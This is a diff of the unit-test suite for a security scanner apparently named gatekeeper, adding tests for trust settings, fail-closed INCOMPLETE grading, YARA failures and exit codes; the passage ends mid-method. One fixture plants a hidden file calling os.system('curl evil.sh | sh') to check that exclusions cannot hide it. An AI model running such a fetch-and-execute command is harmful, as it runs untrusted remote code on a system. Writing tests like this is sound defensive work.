@@ -13,6 +13,7 @@ import unittest
 
 # Import scanner
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from gatekeeper_scanner.models import ScanReport
 from gatekeeper_scanner import (
     SecurityScanner, Finding, ReportPrinter,
     generate_sarif,
@@ -64,11 +65,13 @@ def create_test_repo(files_dict):
     return d
 
 
-def scan_repo(files_dict, skip_deps=True):
-    """Scan a temp repo, clean up, return the ScanReport."""
+def scan_repo(files_dict, skip_deps=True, trust_target=False):
+    """Scan a temp repo, clean up, return the ScanReport. Local paths are no
+    longer auto-trusted, so pass trust_target=True to exercise config/inline
+    suppression behavior."""
     d = create_test_repo(files_dict)
     try:
-        scanner = SecurityScanner(skip_deps=skip_deps)
+        scanner = SecurityScanner(skip_deps=skip_deps, trust_target=trust_target)
         report = scanner.scan(d)
         return report
     finally:
@@ -1002,16 +1005,6 @@ class TestCLI(unittest.TestCase):
         # argparse version action exits with 0
         self.assertIn(VERSION, result.stdout + result.stderr)
 
-    def test_help_shows_current_version(self):
-        """--help description must carry the current VERSION, guarding against
-        the argparse banner drifting behind the package version (was v1.3.0)."""
-        result = subprocess.run(
-            [sys.executable, self.SCAN_PY, "--help"],
-            capture_output=True, text=True
-        )
-        self.assertEqual(result.returncode, 0)
-        self.assertIn(VERSION, result.stdout, "--help banner must show the current VERSION")
-
     def test_nonexistent_target_handled_gracefully(self):
         result = subprocess.run(
             [sys.executable, self.SCAN_PY, "/nonexistent/path/that/does/not/exist"],
@@ -1275,17 +1268,20 @@ class TestInlineSuppression(unittest.TestCase):
     def test_suppression_skips_finding(self):
         # Uses a MEDIUM finding: the P2 trust cap allows target-supplied suppression only for
         # LOW/MEDIUM non-secret findings (a HIGH like eval can no longer be inline-suppressed).
-        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"})
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"},
+                           trust_target=True)
         f = [x for x in report.findings if x.verified and "rmtree" in x.message]
         self.assertEqual(len(f), 0, "Suppressed MEDIUM finding should not be flagged")
 
     def test_suppression_js_style(self):
-        report = scan_repo({"app.js": "document.write(x); // gatekeeper: ignore\n"})
+        report = scan_repo({"app.js": "document.write(x); // gatekeeper: ignore\n"},
+                           trust_target=True)
         f = [x for x in report.findings if x.verified and "document.write" in x.message]
         self.assertEqual(len(f), 0, "JS-style suppression should work")
 
     def test_suppression_case_insensitive(self):
-        report = scan_repo({"app.py": "shutil.rmtree(x)  # GATEKEEPER: IGNORE\n"})
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # GATEKEEPER: IGNORE\n"},
+                           trust_target=True)
         f = [x for x in report.findings if x.verified and "rmtree" in x.message]
         self.assertEqual(len(f), 0, "Case-insensitive suppression should work")
 
@@ -1371,9 +1367,10 @@ class TestTrustModel(unittest.TestCase):
 
     def test_trusted_allows_suppression(self):
         # MEDIUM finding: only LOW/MEDIUM non-secret findings are suppressible under the cap.
-        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"})
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"},
+                           trust_target=True)
         f = [x for x in report.findings if x.verified and "rmtree" in x.message]
-        self.assertEqual(len(f), 0, "Trusted (local) scan should honor suppression")
+        self.assertEqual(len(f), 0, "Trusted (--trust) scan should honor suppression")
 
 
 # ============================================================================
@@ -1588,7 +1585,7 @@ class TestProjectConfig(unittest.TestCase):
             "app.py": "print('ok')\n",
         })
         try:
-            scanner = SecurityScanner(skip_deps=True)
+            scanner = SecurityScanner(skip_deps=True, trust_target=True)
             report = scanner.scan(d)
             eval_f = [f for f in report.findings if f.verified and "eval()" in f.message and "generated" in f.file]
             self.assertEqual(len(eval_f), 0, "Excluded files should not produce findings")
@@ -1606,7 +1603,7 @@ class TestProjectConfig(unittest.TestCase):
             "app.py": "shutil.rmtree(user_dir)\n",
         })
         try:
-            scanner = SecurityScanner(skip_deps=True)
+            scanner = SecurityScanner(skip_deps=True, trust_target=True)
             report = scanner.scan(d)
             build_f = [f for f in report.findings if f.verified and "rmtree" in f.message and "build.py" in f.file]
             app_f = [f for f in report.findings if f.verified and "rmtree" in f.message and "app.py" in f.file]
@@ -1812,9 +1809,13 @@ class TestEnterpriseFeatures(unittest.TestCase):
         self.assertIn("--self-scan", result.stdout)
 
     def test_self_scan_grades_A(self):
-        """Self-scan of the project root must grade A."""
+        """Self-scan of the project root must grade A on code coverage. Deps are
+        explicitly opted out: gatekeeper's own pyproject-declared dependency has
+        no CVE auditor yet (dependency_audit_unaudited would correctly void the
+        grade), and CI must not depend on network CVE lookups."""
         result = subprocess.run(
-            [sys.executable, self.SCAN_PY, "--self-scan", "--json"],
+            [sys.executable, self.SCAN_PY, "--self-scan", "--json",
+             "--skip-deps", "--accept-scoped"],
             capture_output=True, text=True, timeout=30
         )
         self.assertEqual(result.returncode, 0)
@@ -2357,7 +2358,7 @@ class TestAuditFixes(unittest.TestCase):
             "app.py": "print('ok')\n",
         })
         try:
-            scanner = SecurityScanner(skip_deps=True)
+            scanner = SecurityScanner(skip_deps=True, trust_target=True)
             report = scanner.scan(d)
             warning_msgs = " ".join(scanner.warnings)
             self.assertIn("missing 'files' key", warning_msgs, "Should warn about missing files key")
@@ -2617,7 +2618,7 @@ class TestMissingCoverage(unittest.TestCase):
             "app.py": "eval(y)\n",
         })
         try:
-            scanner = SecurityScanner(skip_deps=True)
+            scanner = SecurityScanner(skip_deps=True, trust_target=True)
             report = scanner.scan(d)
             gen_f = [f for f in report.findings if "generated" in f.file]
             app_f = [f for f in report.findings if f.verified and "eval()" in f.message and "app.py" in f.file]
@@ -2667,7 +2668,7 @@ class TestMissingCoverage(unittest.TestCase):
             "app.py": "INTERNAL_SECRET = 'abc123'\n",
         })
         try:
-            scanner = SecurityScanner(skip_deps=True)
+            scanner = SecurityScanner(skip_deps=True, trust_target=True)
             report = scanner.scan(d)
             custom_f = [f for f in report.findings if "Internal secret" in f.message]
             self.assertGreater(len(custom_f), 0, "Custom pattern should produce finding")
@@ -2953,8 +2954,10 @@ class TestCoverageGaps2(unittest.TestCase):
         """--timeout with a generous limit should not interfere with a fast scan."""
         d = create_test_repo({"app.py": "print('ok')\n"})
         try:
+            # --skip-deps scopes the verdict, so CI acceptance needs --accept-scoped.
             result = subprocess.run(
-                [sys.executable, self.SCAN_PY, d, "--timeout", "30", "--quiet", "--skip-deps"],
+                [sys.executable, self.SCAN_PY, d, "--timeout", "30", "--quiet",
+                 "--skip-deps", "--accept-scoped"],
                 capture_output=True, text=True, timeout=30
             )
             self.assertEqual(result.returncode, 0)
@@ -2977,6 +2980,12 @@ class TestOSVFallback(unittest.TestCase):
 
     def _scan_with_osv(self, files, osv_return, no_osv=False):
         d = create_test_repo(files)
+        # Normalize legacy 2-tuple mocks to the (results, warning, coverage) API;
+        # coverage marks full so these tests exercise the clean/vulnerable path.
+        if len(osv_return) == 2:
+            n = len(osv_return[0]) or 1
+            osv_return = (osv_return[0], osv_return[1],
+                          {"requested": n, "queried": n, "responded": n})
         try:
             scanner = SecurityScanner(skip_deps=False, no_osv=no_osv)
             # Force the binary-missing fallback path regardless of host tooling.
@@ -3031,15 +3040,33 @@ class TestOSVFallback(unittest.TestCase):
         # Real client against an unresolvable host returns ([], warning), never raises.
         with mock.patch.object(osv_mod, "OSV_BATCH_URL",
                                "http://gatekeeper.invalid.localhost:9/v1/querybatch"):
-            results, warning = osv_mod.audit_packages(
+            results, warning, coverage = osv_mod.audit_packages(
                 [{"name": "requests", "version": "2.19.0"}], "PyPI", timeout=2)
         self.assertEqual(results, [])
         self.assertIsNotNone(warning)
+        self.assertEqual(coverage["requested"], 1)
 
     def test_audit_packages_empty_input(self):
-        results, warning = osv_mod.audit_packages([], "PyPI")
+        results, warning, coverage = osv_mod.audit_packages([], "PyPI")
         self.assertEqual(results, [])
         self.assertIsNone(warning)
+        self.assertEqual(coverage["requested"], 0)
+
+    def test_audit_packages_internal_cap_at_401(self):
+        """Lock the internal 400-package cap directly: 401 pinned inputs with a
+        mocked batch response must report requested=401, queried=400 so the
+        caller can fail closed to partial. Exercises osv.py, not the caller."""
+        pkgs = [{"name": f"pkg{i}", "version": f"{i}.0.0"} for i in range(401)]
+        # Mock the HTTP batch so no network is touched; return one empty result
+        # per capped query (400), matching OSV's response shape.
+        def fake_post(url, payload, timeout):
+            return {"results": [{} for _ in payload["queries"]]}
+        with mock.patch.object(osv_mod, "_post_json", side_effect=fake_post):
+            results, warning, coverage = osv_mod.audit_packages(pkgs, "PyPI")
+        self.assertIsNone(warning)
+        self.assertEqual(coverage["requested"], 401)
+        self.assertEqual(coverage["queried"], 400)
+        self.assertLess(coverage["queried"], coverage["requested"])
 
 
 # ============================================================================
@@ -3065,12 +3092,16 @@ class TestYaraEngineUnit(unittest.TestCase):
     @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
     def test_webshell_and_clean(self):
         rules, _ = yara_mod.compile_rules()
-        self.assertTrue(yara_mod.scan_bytes(rules, _WEBSHELL.encode()))
-        self.assertEqual(yara_mod.scan_bytes(rules, b"def add(a, b):\n    return a + b\n"), [])
+        matches, err = yara_mod.scan_bytes(rules, _WEBSHELL.encode())
+        self.assertIsNone(err)
+        self.assertTrue(matches)
+        matches, err = yara_mod.scan_bytes(rules, b"def add(a, b):\n    return a + b\n")
+        self.assertIsNone(err)
+        self.assertEqual(matches, [])
 
     def test_scan_bytes_handles_none_rules(self):
         # When rules failed to compile, scan_bytes must no-op, never raise.
-        self.assertEqual(yara_mod.scan_bytes(None, _WEBSHELL.encode()), [])
+        self.assertEqual(yara_mod.scan_bytes(None, _WEBSHELL.encode()), ([], None))
 
 
 class TestYaraIntegration(unittest.TestCase):
@@ -3454,9 +3485,9 @@ class TestPhantomDepAttribution(unittest.TestCase):
 
 
 class TestCoverageDisclosure(unittest.TestCase):
-    """Defect 5 + C3: oversized files and over-length lines are recorded as coverage
-    gaps in the report dict AND surfaced in terminal output and SARIF via the warning
-    plumbing. Disclosure only: the letter grade must not change."""
+    """Fail-closed coverage: oversized files and over-length lines are recorded as
+    coverage gaps, surfaced in terminal output and SARIF, and VOID the letter grade —
+    the report grades INCOMPLETE with no install verdict."""
 
     def _make(self, files):
         d = tempfile.mkdtemp()
@@ -3467,7 +3498,7 @@ class TestCoverageDisclosure(unittest.TestCase):
                 f.write(content)
         return d
 
-    def test_gaps_recorded_grade_unchanged_and_disclosed(self):
+    def test_gaps_void_grade_and_are_disclosed(self):
         base = {"app.py": "def f():\n    return 1\n", "util.py": "def g():\n    return 2\n"}
         withgaps = dict(base)
         withgaps["big.py"] = "x = 1\n" * 120000               # about 720KB, over the 500KB limit
@@ -3482,8 +3513,16 @@ class TestCoverageDisclosure(unittest.TestCase):
             reasons = {g["reason"] for g in gap_report.coverage_gaps}
             self.assertIn("file_exceeds_500KB", reasons)
             self.assertTrue(any("lines_exceed_2000_chars" in r for r in reasons))
-            self.assertEqual(base_report.grade, gap_report.grade,
-                             "coverage gaps must not change the letter grade")
+            # Fail closed: unscanned content means no letter grade and no install verdict.
+            self.assertFalse(base_report.incomplete)
+            self.assertTrue(gap_report.incomplete)
+            self.assertEqual(gap_report.grade, "INCOMPLETE",
+                             "coverage gaps must void the letter grade")
+            self.assertEqual(gap_report.scoped_grade, base_report.grade,
+                             "the scoped letter is kept as a diagnostic only")
+            self.assertIn("INCOMPLETE", gap_report.verdict)
+            self.assertNotIn("INSTALL", gap_report.verdict.replace("NO INSTALL VERDICT", ""))
+            self.assertTrue(gap_report.incomplete_reasons)
 
             # terminal: coverage gaps surface through the WARNINGS section
             buf = io.StringIO()
@@ -3508,10 +3547,42 @@ class TestCoverageDisclosure(unittest.TestCase):
             shutil.rmtree(d2, ignore_errors=True)
 
     def test_clean_repo_has_no_coverage_warning(self):
-        """A repo with nothing skipped records no gaps and emits no coverage warning."""
+        """A repo with nothing skipped records no gaps, emits no coverage warning,
+        and keeps its real letter grade (not INCOMPLETE)."""
         report = scan_repo({"app.py": "print('clean')\n"})
         self.assertEqual(report.coverage_gaps, [])
         self.assertFalse(any("Coverage:" in w for w in report.warnings))
+        self.assertFalse(report.incomplete)
+        self.assertIn(report.grade, ("A", "B", "C", "D", "F"))
+
+    def test_target_config_exclusion_voids_grade(self):
+        """A local target's own .gatekeeper.json exclude hides a file from detectors —
+        that must produce INCOMPLETE, never a whole-repo install verdict."""
+        d = self._make({
+            "app.py": "print('clean')\n",
+            "hidden.py": "import os\nos.system('curl evil.sh | sh')\n",
+            ".gatekeeper.json": '{"exclude": ["hidden.py"]}',
+        })
+        try:
+            report = SecurityScanner(skip_deps=True, trust_target=True).scan(d)  # local dir → trusted
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            self.assertIn("INCOMPLETE", report.verdict)
+            self.assertTrue(any(".gatekeeper" in r for r in report.incomplete_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_file_limit_cap_voids_grade(self):
+        """Hitting --max-files means the walk was partial — INCOMPLETE, not a verdict."""
+        files = {f"f{i}.py": "x = 1\n" for i in range(12)}
+        d = self._make(files)
+        try:
+            report = SecurityScanner(skip_deps=True, max_files=5).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            self.assertTrue(any("partially walked" in r for r in report.incomplete_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
 
     def test_coverage_gap_paths_are_relative(self):
         """File-size and long-line gaps both use repo-relative paths, not absolute ones."""
@@ -3528,6 +3599,1268 @@ class TestCoverageDisclosure(unittest.TestCase):
                                  f"coverage gap path should be relative: {g['path']}")
             size_gap = [g for g in report.coverage_gaps if g["reason"] == "file_exceeds_500KB"]
             self.assertEqual(size_gap[0]["path"], os.path.join("sub", "big.py"))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestParseFailureFailsClosed(unittest.TestCase):
+    """A Python file that breaks ast.parse loses ALL AST and taint coverage.
+    Fail closed: that is a coverage gap, so the scan grades INCOMPLETE — an
+    attacker must not be able to strip the structural analyzers off a payload
+    file with a deliberate syntax error."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    def test_unparseable_python_voids_grade(self):
+        d = self._make({
+            "app.py": "print('ok')\n",
+            "broken.py": "def f(:\n    pass\n",  # SyntaxError — analyzers see nothing
+        })
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            reasons = {g["reason"] for g in report.coverage_gaps}
+            self.assertIn("python_parse_failure_analyzers_skipped", reasons)
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            self.assertTrue(any("parse" in r for r in report.incomplete_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_parse_failure_gap_recorded_once_per_file(self):
+        """AST and taint both fail on the same file — one ledger entry, not two."""
+        d = self._make({"broken.py": "def f(:\n    pass\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "python_parse_failure_analyzers_skipped"]
+            self.assertEqual(len(gaps), 1)
+            self.assertEqual(gaps[0]["path"], "broken.py")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_valid_python_keeps_grade(self):
+        """Guard: parseable Python records no parse gap and stays graded."""
+        report = scan_repo({"app.py": "def f():\n    return 1\n"})
+        self.assertFalse(any(g["reason"] == "python_parse_failure_analyzers_skipped"
+                             for g in report.coverage_gaps))
+        self.assertFalse(report.incomplete)
+
+
+class TestAnalyzerFailureFailsClosed(unittest.TestCase):
+    """Analyzer crashes AFTER a successful parse (visitor bugs, recursion blowups)
+    and analyzer import failures must land in the coverage ledger, not vanish."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_ast_scanner_crash_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"app.py": "x = 1\n"})
+        try:
+            with patch("gatekeeper_scanner.ast_scanner.ASTScanner.scan_file",
+                       side_effect=RuntimeError("visitor bug")):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            gaps = [g for g in report.coverage_gaps if g["reason"] == "ast_analyzer_error"]
+            self.assertTrue(gaps)
+            self.assertEqual(gaps[0]["path"], "app.py")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_taint_crash_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"app.py": "x = 1\n"})
+        try:
+            with patch("gatekeeper_scanner.taint.analyze",
+                       side_effect=RecursionError("deep expression")):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            gaps = [g for g in report.coverage_gaps if g["reason"] == "taint_analyzer_error"]
+            self.assertTrue(gaps)
+            self.assertEqual(gaps[0]["path"], "app.py")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_ast_module_import_failure_voids_grade(self):
+        """The ast_scanner module failing to import is lost coverage, not a pass."""
+        from unittest.mock import patch
+        d = self._make({"app.py": "x = 1\n"})
+        try:
+            # None in sys.modules makes `from gatekeeper_scanner.ast_scanner
+            # import ASTScanner` raise ImportError inside _scan_ast.
+            with patch.dict(sys.modules, {"gatekeeper_scanner.ast_scanner": None}):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "ast_analyzer_unavailable"]
+            self.assertTrue(gaps)
+            self.assertEqual(gaps[0]["path"], "*")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_taint_module_import_failure_voids_grade(self):
+        """The taint module failing to import is lost coverage, not a pass."""
+        from unittest.mock import patch
+        import gatekeeper_scanner as _pkg
+        d = self._make({"app.py": "x = 1\n"})
+        # `from gatekeeper_scanner import taint` resolves the package attribute
+        # first, so remove it AND poison sys.modules to force the ImportError.
+        saved = getattr(_pkg, "taint", None)
+        try:
+            if saved is not None:
+                delattr(_pkg, "taint")
+            with patch.dict(sys.modules, {"gatekeeper_scanner.taint": None}):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "taint_analyzer_unavailable"]
+            self.assertTrue(gaps)
+            self.assertEqual(gaps[0]["path"], "*")
+        finally:
+            if saved is not None:
+                _pkg.taint = saved
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestYaraCoverageLanes(unittest.TestCase):
+    """Three lanes for the signature engine:
+    1. Engine available — ordinary grade tests run with YARA active (rest of suite).
+    2. Engine silently unavailable — coverage gap, INCOMPLETE, exit 1.
+    3. Operator explicitly passes --no-yara — no yara ledger entry, disclosed in
+       disabled_checks (whole-target scoped-verdict semantics land in P0 commit 5)."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_yara_missing_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            with patch("gatekeeper_scanner.yara_engine.available", return_value=False):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            self.assertTrue(any(g["reason"] == "yara_engine_unavailable"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_yara_rule_compile_failure_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            with patch("gatekeeper_scanner.yara_engine.available", return_value=True), \
+                    patch("gatekeeper_scanner.yara_engine.compile_rules",
+                          return_value=(None, "rule syntax error")):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertTrue(any(g["reason"] == "yara_rules_unavailable"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_yara_missing_exits_1(self):
+        from unittest.mock import patch
+        from gatekeeper_scanner.core import main as gk_main
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            buf = io.StringIO()
+            with patch("gatekeeper_scanner.yara_engine.available", return_value=False), \
+                    patch.object(sys, "argv", ["gatekeeper", d, "--skip-deps", "--quiet"]), \
+                    contextlib.redirect_stdout(buf):
+                with self.assertRaises(SystemExit) as cm:
+                    gk_main()
+            self.assertEqual(cm.exception.code, 1)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_explicit_no_yara_is_scoped_not_incomplete(self):
+        """Lane 3 current semantics: explicit opt-out records no yara gap and is
+        disclosed via disabled_checks. (Scoped-verdict semantics: P0 commit 5.)"""
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            report = SecurityScanner(skip_deps=True, no_yara=True).scan(d)
+            self.assertFalse(any("yara" in str(g.get("reason", ""))
+                                 for g in report.coverage_gaps))
+            self.assertTrue(any("--no-yara" in c for c in report.disabled_checks))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestExitCodes(unittest.TestCase):
+    """INCOMPLETE must fail CI. Exit 1 in quiet, JSON, and SARIF modes, and a
+    passing --policy must never bless escaped coverage back to exit 0."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def _run_main(self, argv):
+        from unittest.mock import patch
+        from gatekeeper_scanner.core import main as gk_main
+        buf = io.StringIO()
+        with patch.object(sys, "argv", ["gatekeeper"] + argv), \
+                contextlib.redirect_stdout(buf):
+            with self.assertRaises(SystemExit) as cm:
+                gk_main()
+        return cm.exception.code, buf.getvalue()
+
+    def test_incomplete_exits_1_all_modes(self):
+        d = self._make({"app.py": "print('ok')\n", "broken.py": "def f(:\n    pass\n"})
+        try:
+            for extra in (["--quiet"], ["--json"], ["--sarif"]):
+                code, _ = self._run_main([d, "--skip-deps"] + extra)
+                self.assertEqual(code, 1,
+                                 f"INCOMPLETE must exit 1 in {extra[0]} mode, got {code}")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_policy_pass_cannot_override_incomplete(self):
+        d = self._make({"app.py": "print('ok')\n", "broken.py": "def f(:\n    pass\n"})
+        try:
+            # Permissive policy passes on findings, but coverage escaped → still 1.
+            code, _ = self._run_main([d, "--skip-deps", "--quiet", "--policy", "critical<=99"])
+            self.assertEqual(code, 1, "policy must not override incomplete coverage")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_clean_repo_exits_0(self):
+        # --skip-deps scopes the verdict, so 0 requires explicit acceptance.
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            code, _ = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped"])
+            self.assertEqual(code, 0)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestYaraRuntimeFailClosed(unittest.TestCase):
+    """YARA runtime failures are lost coverage, not clean results: engine match
+    errors, unreadable targets, and content beyond the 2MB scan cap must all
+    land in the coverage ledger and void the grade."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            mode = "wb" if isinstance(content, bytes) else "w"
+            with open(p, mode) as f:
+                f.write(content)
+        return d
+
+    def test_scan_bytes_surfaces_engine_error(self):
+        class _Boom:
+            def match(self, data):
+                raise RuntimeError("engine fault")
+        matches, err = yara_mod.scan_bytes(_Boom(), b"payload")
+        self.assertEqual(matches, [])
+        self.assertIn("RuntimeError", err)
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_engine_error_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            with patch("gatekeeper_scanner.yara_engine.scan_bytes",
+                       return_value=([], "RuntimeError: engine fault")):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertTrue(any(g["reason"] == "yara_scan_error"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    @unittest.skipIf(os.name == "nt", "chmod-000 does not block reads on Windows; see mocked variant")
+    def test_unreadable_target_voids_grade(self):
+        """Platform integration lane: a real chmod-000 file. May behave
+        differently under root/Windows; the deterministic regression is the
+        mocked variant below."""
+        d = self._make({"app.py": "print('ok')\n", "blob.bin": b"\x00\x01payload"})
+        blocked = os.path.join(d, "blob.bin")
+        os.chmod(blocked, 0o000)
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "yara_unreadable_file"]
+            self.assertTrue(gaps, f"expected unreadable gap, got {report.coverage_gaps}")
+            self.assertTrue(report.incomplete)
+        finally:
+            os.chmod(blocked, 0o644)
+            shutil.rmtree(d, ignore_errors=True)
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_unreadable_target_mocked_open_voids_grade(self):
+        """Deterministic security regression: open() raising for the YARA read
+        must record the unreadable file regardless of platform/privilege."""
+        import builtins
+        from unittest.mock import patch
+        d = self._make({"app.py": "print('ok')\n", "blob.bin": b"\x00\x01payload"})
+        real_open = builtins.open
+
+        def flaky_open(path, *a, **k):
+            mode = a[0] if a else k.get("mode", "r")
+            if str(path).endswith("blob.bin") and "b" in mode:
+                raise PermissionError(13, "denied by test")
+            return real_open(path, *a, **k)
+
+        try:
+            with patch("builtins.open", side_effect=flaky_open):
+                report = SecurityScanner(skip_deps=True).scan(d)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "yara_unreadable_file"]
+            self.assertTrue(gaps, f"expected unreadable gap, got {report.coverage_gaps}")
+            self.assertEqual(gaps[0]["path"], "blob.bin")
+            self.assertTrue(report.incomplete)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_oversize_binary_truncation_voids_grade(self):
+        """A binary past the 2MB YARA cap gets no oversize gap from the text path,
+        so the signature scan must record its own truncation."""
+        d = self._make({
+            "app.py": "print('ok')\n",
+            "blob.bin": b"A" * 2_500_001,
+        })
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            gaps = [g for g in report.coverage_gaps
+                    if g["reason"] == "yara_scan_truncated"]
+            self.assertTrue(gaps, f"expected truncation gap, got {report.coverage_gaps}")
+            self.assertEqual(gaps[0]["path"], "blob.bin")
+            self.assertTrue(report.incomplete)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestScopedVerdict(unittest.TestCase):
+    """Operator opt-outs and report-narrowing flags make a scan SCOPED: the letter
+    grade survives as a diagnostic for the scanned surface, but the verdict names
+    the narrowing mechanisms and is never a bare whole-target INSTALL. CI accepts
+    scoped scans only with an explicit --accept-scoped."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_skip_deps_scopes_verdict(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.scoped)
+            self.assertIn("SCOPED", report.verdict)
+            self.assertNotEqual(report.verdict, "INSTALL")
+            self.assertIn(report.grade, ("A", "B", "C", "D", "F"),
+                          "letter grade survives as scoped diagnostic")
+            self.assertTrue(any("dep" in r.lower() for r in report.scope_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_full_scan_is_not_scoped(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            report = SecurityScanner().scan(d)  # no opt-outs, no manifests → offline
+            self.assertFalse(report.scoped)
+            self.assertEqual(report.scope_reasons, [])
+            self.assertEqual(report.verdict, "INSTALL")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_incomplete_wins_over_scoped(self):
+        d = self._make({"app.py": "print('ok')\n", "broken.py": "def f(:\n    pass\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertEqual(report.grade, "INCOMPLETE")
+            self.assertIn("INCOMPLETE", report.verdict)
+            self.assertNotIn("SCOPED", report.verdict)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_operator_exclude_scopes_when_effective(self):
+        d = self._make({"app.py": "print('ok')\n", "vendor.py": "x = 1\n"})
+        try:
+            report = SecurityScanner(skip_deps=True,
+                                     exclude_patterns=["vendor.py"]).scan(d)
+            self.assertTrue(report.scoped)
+            self.assertTrue(any("exclude" in r.lower() for r in report.scope_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_ineffective_exclude_does_not_scope(self):
+        """A pattern that matched nothing removed no coverage."""
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            report = SecurityScanner(exclude_patterns=["nonexistent_*.py"]).scan(d)
+            self.assertFalse(any("exclude" in r.lower() for r in report.scope_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def _run_main(self, argv):
+        from unittest.mock import patch
+        from gatekeeper_scanner.core import main as gk_main
+        buf = io.StringIO()
+        with patch.object(sys, "argv", ["gatekeeper"] + argv), \
+                contextlib.redirect_stdout(buf):
